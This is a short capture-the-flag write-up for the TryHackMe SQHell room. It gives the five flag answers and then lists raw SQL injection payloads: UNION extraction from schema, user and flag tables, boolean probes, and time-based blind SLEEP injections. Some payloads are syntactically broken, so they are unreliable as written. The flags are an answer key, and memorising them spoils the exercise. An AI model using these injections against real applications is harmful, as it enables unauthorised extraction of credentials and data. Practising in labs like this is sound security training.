# TryHackMe SQHell

> Saikat Karmakar | Aug 10 : 2021

---

## Task 1

1. Flag 1
```
THM{FLAG1:E786483E5A53075750F1FA792E823BD2}
```
2. Flag 2
```
THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15}
```
3. Flag 3
```
THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}
```
4. Flag 4
```
THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}
```
5. Flag 5
```
THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}
```


**Used to build the payloads**

id=1 and 1=2 UNION SELECT 1,column_name,3,4 FROM information_schema.columns where table_name='flag' limit 0,1 -- -

id=1 and 1=2 UNION SELECT 1,id,flag,4 FROM sqhell_5.flag LIMIT 0,1-- -

id=1 and 1=2 UNION SELECT 1,2,CONCAT(id,flag),4 FROM sqhell_5.flag LIMIT 0,1-- -

admin' UNION SELECT NULL FROM flag WHERE flag LIKE 'T%25

admin'  AND (SELECT SUBSTR((SELECT flag from flag),1,1)='T') AND '1'='1

1' AND (SELECT 1 FROM (SELECT(SLEEP(10-IF(1=1))))bAKL) AND 'vRxe'='vRxe 

1' AND (SELECT 1 FROM (SELECT(SLEEP(10-(IF(1=1))))XyZk) 

1' AND (SELECT 1 FROM (SELECT(SLEEP(10)))XyZk)-- CYEd

1' AND (SELECT 1 FROM (SELECT(SLEEP(10-IF(1=1))))bAKL) AND 'vRxe'='vRxe 


1' AND (SELECT 1 FROM (SELECT(SLEEP(10-(IF(SUBSTR((SELECT flag from flag),1,1)='T',0,10)))))bAKL) AND 'vRxe'='vRxe

1' AND (SELECT 1 FROM (SELECT(SLEEP(5-(IF(1=1)))XyZk)-- CYEd



1 AND 1=1 -- - 

1 UNION ALL SELECT 'flag',2,3 -- - 
2 UNION ALL SELECT username(),2,3 FROM sqhell_4.flag-- -

2 UNION ALL SELECT group_concat(flag,0x3a,id),2,3 FROM sqhell_4-- - 

1 AND 1=2 UNION SELECT NULL,CONCAT(username,'-',password),NULL FROM information_schema.tables WHERE table_name='users' LIMIT 0,1-- -


id=2 AND (SELECT 3130 FROM (SELECT CASE WHEN (1=2) THEN 1/0 ELSE SLEEP(10) END)QtfL)

1 AND 1=2 UNION SELECT NULL,column_name,NULL FROM information_schema.columns where table_name='users' LIMIT 0,1-- -



2 UNION ALL SELECT  "2 UNION ALL SELECT 1,flag,3,4 from flag -- - ",2,3 FROM users-- -


1 AND (SELECT 1 FROM (SELECT(SLEEP(10-(IF(SUBSTR((SELECT username from users ),1,1)='b',0,10)))))bAKL) 